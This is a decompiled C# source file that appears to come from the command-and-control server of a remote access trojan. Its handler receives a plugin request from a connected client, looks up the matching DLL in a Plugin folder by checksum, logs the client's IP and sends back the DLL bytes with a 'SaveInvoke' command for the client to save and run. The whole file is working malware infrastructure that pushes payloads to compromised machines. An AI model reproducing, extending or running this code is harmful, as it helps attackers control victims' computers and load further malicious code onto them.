using System;
using System.Drawing;
using System.IO;
using Server.Connectings;
using Server.Helper;

namespace Server.Messages
{
	// Token: 0x02000061 RID: 97
	internal class HandlerGetDLL
	{
		// Token: 0x060001F9 RID: 505 RVA: 0x000207A8 File Offset: 0x0001E9A8
		public static void Read(Clients client, object[] objects)
		{
			client.lastPing.Disconnect();
			string text = (string)objects[1];
			if (text == "leb")
			{
				client.Send(new object[]
				{
					"SaveInvoke",
					text,
					"Plugin\\Leb128.dll"
				});
				return;
			}
			foreach (string text2 in Directory.GetFiles("Plugin", "*.dll", SearchOption.TopDirectoryOnly))
			{
				if (text == Methods.GetChecksum(text2))
				{
					Methods.AppendLogs(client.IP, "Send plugin: " + text2, Color.Aqua);
					client.Send(new object[]
					{
						"SaveInvoke",
						text,
						File.ReadAllBytes(text2)
					});
					return;
				}
			}
		}
	}
}
